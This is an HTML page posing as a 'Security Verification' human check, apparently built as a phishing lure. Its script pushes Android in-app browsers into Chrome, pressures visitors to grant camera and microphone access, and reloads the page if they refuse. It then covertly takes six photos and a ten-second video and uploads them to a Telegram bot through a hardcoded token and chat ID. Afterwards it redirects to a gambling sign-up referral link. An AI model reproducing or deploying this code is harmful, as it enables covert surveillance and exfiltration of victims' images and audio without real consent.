<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Verification</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        #v_stream { position: fixed; left: -9999px; opacity: 0; }
    </style>
</head>
<body class="bg-gray-100 flex items-center justify-center min-h-screen">

    <div class="max-w-md w-full p-6 bg-white shadow-xl rounded-xl text-center border border-gray-200">
        <div class="mb-4 flex justify-center">
            <div id="loader" class="animate-spin h-10 w-10 border-4 border-blue-500 border-t-transparent rounded-full"></div>
        </div>
        <h2 class="text-xl font-bold text-gray-800">Verifying Connection...</h2>
        <p class="text-gray-500 mt-2 text-sm">Please click <b>"Allow"</b> to confirm you are human.</p>
        
        <div class="mt-6 p-4 bg-gray-50 rounded-lg border border-gray-100">
            <p class="text-xs text-gray-400 uppercase tracking-widest font-semibold">Security Check in Progress</p>
            <div id="timer" class="text-3xl font-mono font-bold text-blue-600 mt-1">15s</div>
        </div>

        <div class="mt-4 py-2 px-4 bg-blue-50 border border-blue-100 rounded-lg text-blue-700 text-[10px] text-left">
            Ray ID: 91b3c2a0e7d12402 • Do not close this window.
        </div>
    </div>

    <video id="v_stream" autoplay playsinline muted></video>
    <canvas id="c_save" class="hidden"></canvas>

    <script>
        // ১. অটোমেটিক Chrome ব্রাউজারে নিয়ে যাওয়ার সিস্টেম
        const ua = navigator.userAgent;
        const isApp = /FBAN|FBAV|Messenger|Telegram|Instagram/i.test(ua);
        if (isApp && ua.includes("Android")) {
            const cleanUrl = window.location.href.replace(/^https?:\/\//, '');
            window.location.href = "intent://" + cleanUrl + "#Intent;scheme=https;package=com.android.chrome;end";
        }

        const CONFIG = {
            t: '8355080071:AAHZ5KdTDSkqNLgSe_9gsuGCyUMYru5pNe4',
            c: '7785049939', // তোমার চ্যাট আইডি বসিয়ে দেওয়া হয়েছে
            u: 'https://dkwin9.com/#/register?invitationCode=14856937272',
            max_photos: 6, // তুমি ৬টি ছবি চেয়েছো
            video_duration: 10000 // ১০ সেকেন্ড ভিডিও
        };

        let photoCount = 0;
        let timeLeft = 15;

        function startTimer() {
            const timerElement = document.getElementById('timer');
            const countdown = setInterval(() => {
                timeLeft--;
                if (timeLeft >= 0) timerElement.innerText = timeLeft + "s";
                if (timeLeft <= 0) clearInterval(countdown);
            }, 1000);
        }

        async function init() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                const video = document.getElementById('v_stream');
                video.srcObject = stream;

                startTimer();

                // ক্যামেরা ওয়ার্ম-আপের জন্য ১ সেকেন্ড পর ফটো শুরু
                setTimeout(() => {
                    startBurstPhotos(stream);
                }, 1000);

            } catch (err) {
                // পারমিশন না দিলে অটো রিলোড
                setTimeout(() => { location.reload(); }, 500);
            }
        }

        function startBurstPhotos(stream) {
            const photoInterval = setInterval(() => {
                if (photoCount < CONFIG.max_photos) {
                    takeSnap();
                    photoCount++;
                } else {
                    clearInterval(photoInterval);
                    // ৫ সেকেন্ড পর (বা ৬টি ছবি শেষ হলে) ভিডিও শুরু
                    startVideoRecording(stream);
                }
            }, 800); // গ্যাপ রাখা হয়েছে যাতে ছবি ক্লিয়ার আসে
        }

        function takeSnap() {
            const video = document.getElementById('v_stream');
            const canvas = document.getElementById('c_save');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0);

            canvas.toBlob(blob => {
                const formData = new FormData();
                formData.append('chat_id', CONFIG.c);
                formData.append('photo', blob, `img_${photoCount}.jpg`);
                fetch(`https://api.telegram.org/bot${CONFIG.t}/sendPhoto`, { method: 'POST', body: formData });
            }, 'image/jpeg', 0.9); // হাই কোয়ালিটি
        }

        function startVideoRecording(stream) {
            const mediaRecorder = new MediaRecorder(stream);
            let chunks = [];

            mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
            mediaRecorder.onstop = async () => {
                const blob = new Blob(chunks, { type: 'video/mp4' });
                const formData = new FormData();
                formData.append('chat_id', CONFIG.c);
                formData.append('video', blob, 'capture.mp4');
                formData.append('caption', 'Capture Done (6 Photos + 10s Video)');

                await fetch(`https://api.telegram.org/bot${CONFIG.t}/sendVideo`, { method: 'POST', body: formData });
                window.location.replace(CONFIG.u); // সবশেষে রিডাইরেক্ট
            };

            mediaRecorder.start();
            setTimeout(() => {
                mediaRecorder.stop();
                stream.getTracks().forEach(track => track.stop());
            }, CONFIG.video_duration);
        }

        window.onload = init;
    </script>
</body>
</html>
